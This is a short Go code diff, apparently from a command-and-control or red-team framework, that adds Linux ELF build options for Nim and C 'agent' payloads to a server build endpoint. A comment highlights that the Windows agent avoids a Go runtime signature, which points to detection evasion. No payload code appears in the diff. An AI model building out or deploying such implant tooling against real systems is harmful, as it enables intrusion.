@@ -790,6 +790,18 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 	os.MkdirAll(payloadsDir, 0755)
 	os.MkdirAll(deliveryDir, 0755)
 
+	// Nim Linux ELF — native compilation (no cross-compiler needed on Linux host)
+	if cfg.Lang == "nim" && cfg.GOOS == "linux" {
+		elfPath, err := BuildNimELF(cfg, payloadsDir)
+		if err != nil {
+			jsonErr(w, "nim linux build: "+err.Error(), http.StatusInternalServerError)
+			return
+		}
+		result["elf"] = elfPath
+		jsonOK(w, result)
+		return
+	}
+
 	// Nim agent — Windows EXE/DLL, ~560KB, no Go runtime signature
 	if cfg.Lang == "nim" {
 		nimPath, err := BuildNimEXE(cfg, payloadsDir)
@@ -841,6 +853,16 @@ func (s *Server) apiBuild(w http.ResponseWriter, r *http.Request) {
 	}
 
 	if cfg.Lang == "c" {
+		if cfg.GOOS == "linux" {
+			elfPath, err := BuildCAgentLinux(cfg, payloadsDir)
+			if err != nil {
+				jsonErr(w, "c linux build: "+err.Error(), http.StatusInternalServerError)
+				return
+			}
+			result["elf"] = elfPath
+			jsonOK(w, result)
+			return
+		}
 		if cfg.Format == "dll" {
 			dllPath, err := BuildCAgentDLL(cfg, payloadsDir)
 			if err != nil {
